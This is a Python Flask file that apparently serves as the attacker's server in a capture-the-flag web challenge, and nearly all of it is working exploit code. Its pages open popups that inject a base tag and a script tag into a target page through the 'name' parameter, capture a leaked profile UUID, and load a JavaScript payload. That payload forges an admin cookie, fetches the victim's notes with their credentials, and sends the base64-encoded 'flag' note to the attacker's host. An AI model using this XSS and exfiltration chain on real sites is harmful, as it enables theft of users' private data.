from __future__ import annotations
from dataclasses import dataclass
from typing import Optional
from flask import Flask, Response, make_response, render_template_string, url_for


@dataclass(frozen=True)
class AppConfig:
    MY_SERVER: str = "http://MY_SAVER/"
    BASE_URL: str = "http://127.0.0.1:8000"


config = AppConfig()
app = Flask(__name__)


class State:
    last_uuid: Optional[str] = None


state = State()

INDEX_HTML = """\
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Launcher1</title>
  <script>
    window.onload = function() {
      window.open("{{ base_url }}/?name=</title><base href={{ my_server }}><img src=%22");
      setTimeout(function() {
        window.location.href = "{{ xss_path }}";
      }, 2000);
    };
  </script>
</head>
<body>
  <h1>Opening popup 1…</h1>
</body>
</html>
"""

XSS_HTML = """\
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Launcher2</title>
  <script>
    window.onload = function() {
      window.open("{{ base_url }}/profile/{{ last_uuid }}/?name=</title><script src={{ my_server }}/payload><%2Fscript><img src=%22");
    };
  </script>
</head>
<body>
  <h1>Opening popup 2…</h1>
</body>
</html>
"""


@app.route("/")
def index() -> Response:
    html = render_template_string(
        INDEX_HTML,
        base_url=config.BASE_URL,
        my_server=config.MY_SERVER,
        xss_path=url_for("xss"),
    )
    return Response(html, mimetype="text/html; charset=utf-8")


@app.route("/xss")
def xss() -> Response:
    html = render_template_string(
        XSS_HTML,
        base_url=config.BASE_URL,
        my_server=config.MY_SERVER.rstrip("/"),
        last_uuid=(state.last_uuid or ""),
    )
    return Response(html, mimetype="text/html; charset=utf-8")


@app.route("/images/<uuid_str>")
def receive_uuid(uuid_str: str):
    cleaned = uuid_str.lower()
    if cleaned.endswith(".png"):
        cleaned = cleaned[: -len(".png")]
    state.last_uuid = cleaned
    return make_response(("", 200, {"Content-Type": "image/png"}))


@app.route("/payload")
def payload() -> Response:
    js = f"""
async function fetchFlagNoteAndSend({{base=location.origin,label='flag',targetBase='{config.MY_SERVER}'}}={{}}) {{
  document.cookie='=isAdmin=true; path=/';
  const listRes=await fetch(new URL('/notes',base),{{credentials:'include'}});
  if(!listRes.ok)throw new Error(`/notes fetch failed: ${{listRes.status}}`);
  const listHtml=await listRes.text();
  const parser=new DOMParser();
  const listDoc=parser.parseFromString(listHtml,'text/html');
  const candLinks=[...listDoc.querySelectorAll('a[href^="/notes/"]')].filter(a=>/\\/notes\\/[0-9a-f]{{12}}$/i.test(a.getAttribute('href')||''));
  if(candLinks.length===0)throw new Error('no note links found');
  const linkEl=candLinks.find(a=>a.textContent.trim().toLowerCase()===label.toLowerCase())||candLinks[0];
  const noteUrl=new URL(linkEl.getAttribute('href'),base);
  const noteRes=await fetch(noteUrl,{{credentials:'include'}});
  if(!noteRes.ok)throw new Error(`${{noteUrl.pathname}} fetch failed: ${{noteRes.status}}`);
  const noteHtml=await noteRes.text();
  const noteDoc=parser.parseFromString(noteHtml,'text/html');
  const main=noteDoc.querySelector('main');
  const text=(main?main.innerText:noteDoc.body?.innerText||'').trim();
  const b64=btoa(unescape(encodeURIComponent(text)));
  const targetUrl=`${{targetBase}}?omg=${{encodeURIComponent(b64)}}`;
  await fetch(targetUrl,{{mode:'no-cors'}});
  return targetUrl;
}}
fetchFlagNoteAndSend().then(u=>console.log('Sent to:',u)).catch(console.error);
"""
    return Response(js.strip(), mimetype="application/javascript; charset=utf-8")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
